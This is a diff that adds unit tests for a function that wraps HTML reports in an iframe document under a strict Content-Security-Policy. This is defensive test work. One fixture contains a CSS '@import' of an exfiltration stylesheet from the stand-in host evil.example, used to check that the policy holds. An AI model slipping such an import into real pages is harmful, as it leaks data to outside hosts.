@@ -23,10 +23,14 @@ import { readFileSync } from "node:fs";
 import path from "node:path";
 import { fileURLToPath } from "node:url";
 import type { Shell } from "arp-report-html";
-import { splitShell } from "arp-report-html";
+import { reinjectShell, splitShell } from "arp-report-html";
 import { parseHTML } from "linkedom";
 import { describe, expect, it } from "vitest";
-import { buildIframeDocument, IFRAME_INJECTED_CSS } from "./iframe-document";
+import {
+  buildIframeDocument,
+  buildReadOnlyIframeDocument,
+  IFRAME_INJECTED_CSS,
+} from "./iframe-document";
 
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const FIXTURE_PATH = path.resolve(
@@ -215,5 +219,100 @@ describe("buildIframeDocument", () => {
     // The attribute value survives verbatim as an attribute, not as markup.
     expect(parsed.body.getAttribute("data-x")).toBe("<head>");
     expect(parsed.querySelectorAll("head")).toHaveLength(1);
+  });
+});
+
+describe("buildReadOnlyIframeDocument", () => {
+  // View mode / Compare (F-1): the caller passes an ALREADY-ASSEMBLED full
+  // document — typically `reinjectShell(shell, bodyHtml)` — unlike
+  // `buildIframeDocument`, which only ever receives the shell (empty body,
+  // PM mounts and populates it). Same CSP-injection mechanism underneath;
+  // this suite re-proves the same security contract for this second entry
+  // point rather than assuming it transfers, plus the one real behavioral
+  // difference: body content is PRESERVED, not emptied.
+
+  function makeFullHtml(bodyHtml: string, overrides: Partial<Shell> = {}): string {
+    const shell: Shell = {
+      pre:
+        '<!doctype html><html><head><meta charset="utf-8"><style>body{color:red}</style></head>' +
+        '<body class="report" data-theme="dark">',
+      post: "</body></html>",
+      ...overrides,
+    };
+    return reinjectShell(shell, bodyHtml);
+  }
+
+  it("inserts the CSP meta tag as the first child of <head>, before the report's own <style>", () => {
+    const doc = buildReadOnlyIframeDocument(makeFullHtml("<p>hello</p>"), testParse);
+    const parsed = parseOutput(doc);
+    expect(parsed.head.firstElementChild?.tagName).toBe("META");
+    expect(parsed.head.firstElementChild?.getAttribute("http-equiv")).toBe(
+      "Content-Security-Policy",
+    );
+    const cspIndex = doc.indexOf("Content-Security-Policy");
+    const reportStyleIndex = doc.indexOf("body{color:red}");
+    expect(cspIndex).toBeGreaterThan(-1);
+    expect(cspIndex).toBeLessThan(reportStyleIndex);
+  });
+
+  it("locks the CSP down identically to buildIframeDocument: no script/fetch, inline-only style, data:-only images/fonts, no 'self'", () => {
+    const doc = buildReadOnlyIframeDocument(makeFullHtml("<p>hello</p>"), testParse);
+    const match = /content="([^"]*)"/.exec(doc);
+    const content = match?.[1] ?? "";
+    expect(content).toContain("default-src 'none'");
+    expect(content).toContain("style-src 'unsafe-inline'");
+    expect(content).toContain("img-src data:");
+    expect(content).toContain("font-src data:");
+    expect(content).toContain("base-uri 'none'");
+    expect(content).not.toContain("script-src");
+    expect(content).not.toContain("'self'");
+  });
+
+  it("PRESERVES the body content passed in (unlike buildIframeDocument, which always yields an empty body)", () => {
+    const doc = buildReadOnlyIframeDocument(
+      makeFullHtml('<p class="rt">Hello <strong>world</strong></p>'),
+      testParse,
+    );
+    const parsed = parseOutput(doc);
+    expect(parsed.body.innerHTML).toContain('<p class="rt">Hello <strong>world</strong></p>');
+    expect(parsed.body.getAttribute("data-theme")).toBe("dark");
+  });
+
+  it("is not fooled by a decoy <head foo> inside an HTML comment preceding the real head", () => {
+    const fullHtml =
+      "<!doctype html><html><!-- decoy <head foo> -->" +
+      "<head><style>@import url(https://evil.example/exfil.css);</style></head>" +
+      '<body class="report"><div class="rd">diff content</div></body></html>';
+    const doc = buildReadOnlyIframeDocument(fullHtml, testParse);
+    const parsed = parseOutput(doc);
+    expect(parsed.head.firstElementChild?.tagName).toBe("META");
+    expect(parsed.head.firstElementChild?.getAttribute("http-equiv")).toBe(
+      "Content-Security-Policy",
+    );
+    const children = [...parsed.head.children];
+    const styleIndex = children.findIndex((el) => el.tagName === "STYLE");
+    expect(styleIndex).toBeGreaterThan(0);
+    // The body content still comes through despite the decoy.
+    expect(parsed.body.innerHTML).toContain("diff content");
+  });
+
+  it("falls back to a synthesized head when the input has no <head>...</head> (defensive)", () => {
+    const fullHtml = '<body class="x"><p>orphan</p></body>';
+    const doc = buildReadOnlyIframeDocument(fullHtml, testParse);
+    expect(doc).toContain("Content-Security-Policy");
+    expect(doc).toContain(".comment-highlight");
+    expect(doc).toContain('<body class="x">');
+    expect(doc).toContain("<p>orphan</p>");
+  });
+
+  it("wraps the real fixture's shell + body without throwing and keeps both the style and body content intact", () => {
+    const original = readFileSync(FIXTURE_PATH, "utf-8");
+    const { shell, bodyHtml } = splitShell(original);
+    const doc = buildReadOnlyIframeDocument(reinjectShell(shell, bodyHtml), testParse);
+    expect(doc).toContain("Content-Security-Policy");
+    expect(doc).toContain(".role-head { display: flex;");
+    expect(doc).toContain(".comment-highlight");
+    const parsed = parseOutput(doc);
+    expect(parsed.body.innerHTML.length).toBeGreaterThan(0);
   });
 });
